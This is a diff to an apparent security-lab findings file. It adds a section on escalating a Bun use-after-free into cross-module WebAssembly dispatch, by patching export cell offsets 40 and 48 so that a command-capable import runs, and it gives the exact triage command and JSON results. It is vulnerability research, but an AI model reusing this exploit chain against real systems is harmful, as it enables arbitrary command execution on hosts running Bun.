@@ -261,6 +261,82 @@ Filesystem side effects from the representative run:
 /tmp/bun_uaf_noffi_wasm_marker: wasm-marker:<pid>
 ```
 
+## Cross-module command-marker mode
+
+The command-marker path also works across two independent WebAssembly modules
+when both the forged descriptor at export `a` cell offset `48` and the
+per-module context pointer at export `a` cell offset `40` are patched from the
+replacement export.
+
+This run uses:
+
+* module A: export `a`, returns `42`, no imports
+* module B: export `b`, calls imported `env.mark`, returns `7`
+* corrupted target: module A's `a` function cell
+* attacker-controlled forged descriptor: `ArrayBuffer` backing store containing
+  module B's descriptor qword
+* extra context patch: module A `a` cell offset `40` replaced with module B
+  `b` cell offset `40`
+
+Command:
+
+```sh
+rm -f /tmp/bun_uaf_noffi_wasm_marker /tmp/bun_uaf_noffi_command_marker
+ASAN_OPTIONS=halt_on_error=1:abort_on_error=0:exitcode=66:detect_leaks=0:detect_stack_use_after_return=1:strict_string_checks=1:check_initialization_order=1:detect_invalid_pointer_pairs=2:fast_unwind_on_fatal=1:malloc_context_size=64:allocator_may_return_null=0:print_stats=0:symbolize=0:print_module_map=0:quarantine_size_mb=0 \
+TIMEOUT=240 CROSS_MODULE=1 MARKER_IMPORT=1 COMMAND_IMPORT=1 \
+FAKE_DESCRIPTOR=1 FAKE_DESCRIPTOR_MODE=replacement EXTRA_CELL_FIELDS=40 \
+MARKER_PATH=/tmp/bun_uaf_noffi_wasm_marker \
+COMMAND_MARKER_PATH=/tmp/bun_uaf_noffi_command_marker \
+MARKER_COMMAND="printf 'cross-command:%s\n' \"$$\" > /tmp/bun_uaf_noffi_command_marker" \
+lab/scripts/triage.sh \
+  lab/harnesses/13-arb-rw-probes/wasm-export-code-pointer-redirect-probe.js
+```
+
+Run:
+
+`lab/findings/runs/20260510T091415Z-17776/asan.log`
+
+Key facts:
+
+```json
+{
+  "crossModule": true,
+  "commandImport": true,
+  "commandMarkerBefore": false,
+  "commandMarkerAfter": true,
+  "commandResultAfter": { "status": 0, "error": null },
+  "fakeDescriptor": true,
+  "extraCellFields": [40],
+  "extraPatches": [
+    {
+      "offset": 40,
+      "originalValue": "0x0000615000033008",
+      "replacementValue": "0x0000616000013008"
+    }
+  ],
+  "effectiveReplacementPatchValue": "0x00006020001aabf0",
+  "patchedA": 7,
+  "restoredA": 42,
+  "ok": true
+}
+```
+
+Filesystem side effects:
+
+```text
+/tmp/bun_uaf_noffi_command_marker: cross-command:<pid>
+/tmp/bun_uaf_noffi_wasm_marker: wasm-marker:<pid>
+```
+
+Without the offset-40 context patch, the imported cross-module body crashes at a
+null PC (`lab/findings/runs/20260510T091254Z-11933/asan.log`). The pure-return
+cross-module body does not need the context patch and redirects cleanly with the
+forged descriptor alone (`lab/findings/runs/20260510T091323Z-14478/asan.log`).
+
+This improves the primitive from same-module export substitution to
+cross-module dispatch control: a call to one module's export can be made to
+enter code and import context from another module through the corrupted metadata.
+
 ## Current impact
 
 Confirmed:
@@ -272,6 +348,8 @@ Confirmed:
 * marker file creation through the redirected wasm export path
 * command-marker creation through a redirected wasm import path when the local
   JS environment provides the command-capable import
+* cross-module command-marker dispatch by patching the forged descriptor at
+  cell offset `48` and replacement-module context at cell offset `40`
 * clean restoration of the corrupted export metadata after the call
 
 Not demonstrated:
